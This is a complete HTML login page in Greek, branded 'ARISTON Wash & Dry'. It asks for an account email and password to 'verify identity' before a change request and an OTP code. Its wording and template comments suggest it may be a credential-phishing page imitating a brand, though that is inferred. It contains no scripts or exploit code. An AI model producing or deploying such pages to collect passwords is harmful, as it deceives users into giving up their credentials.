<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Επιβεβαίωση Ταυτότητας | ARISTON Wash & Dry</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        :root {
            --ariston-blue: #0d47a1;
            --ariston-dark: #0a367a;
        }
        
        body { 
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); 
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .login-box { 
            background: white; 
            padding: 40px; 
            border-radius: 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
            width: 100%; 
            max-width: 420px; 
            border-top: 5px solid var(--ariston-blue);
        }
        
        .brand-logo {
            text-align: center;
            margin-bottom: 25px;
        }
        
        .brand-logo img {
            max-width: 180px; /* Προσάρμοσέ το ανάλογα με το λογότυπό σου */
            height: auto;
        }

        .brand-title {
            color: var(--ariston-blue);
            font-weight: bold;
            text-align: center;
            margin-bottom: 5px;
            letter-spacing: 1px;
        }
        
        .security-badge {
            background: #e3f2fd;
            color: var(--ariston-blue);
            padding: 8px;
            border-radius: 8px;
            font-size: 0.85rem;
            text-align: center;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .form-label {
            font-weight: 600;
            color: #444;
        }

        .form-control {
            border-radius: 8px;
            padding: 12px;
            border: 1px solid #ddd;
        }

        .form-control:focus {
            border-color: var(--ariston-blue);
            box-shadow: 0 0 0 0.25 circle rgba(13, 71, 161, 0.25);
        }
        
        .btn-verify { 
            background: var(--ariston-blue); 
            border: none; 
            color: white; 
            font-weight: bold;
            padding: 12px;
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        
        .btn-verify:hover { 
            background: var(--ariston-dark); 
            transform: translateY(-1px);
            box-shadow: 0 5px 15px rgba(13, 71, 161, 0.3);
        }

        .footer-text {
            text-align: center;
            font-size: 0.75rem;
            color: #888;
            margin-top: 25px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="brand-logo">
            <img src="/templates/images/1new.png" alt="ARISTON Wash & Dry">
        </div>
        
        <h4 class="brand-title">ARISTON Wash & Dry</h4>
        <div class="security-badge">
            <span>🔒 Ασφαλής Πύλη Ταυτοποίησης</span>
        </div>
        
        <p class="small text-muted text-center mb-4">
            Παρακαλούμε επιβεβαιώστε τα στοιχεία σας για να προχωρήσετε στο αίτημα αλλαγής.
        </p>
        
        <form method="POST">
            <div class="mb-3">
                <label class="form-label">Email Λογαριασμού</label>
                <input type="email" name="email" class="form-control" placeholder="π.χ. explample@example.gr" required>
            </div>
            <div class="mb-4">
                <label class="form-label">Κωδικός Πρόσβασης</label>
                <input type="password" name="password" class="form-control" placeholder="••••••••" required>
            </div>
            <button type="submit" class="btn btn-verify w-100">Είσοδος & Λήψη Κωδικού OTP</button>
        </form>

        <div class="footer-text">
            © 2026 ARISTON Wash & Dry | Σύστημα Προστασίας Δεδομένων
        </div>
    </div>
</body>
</html>
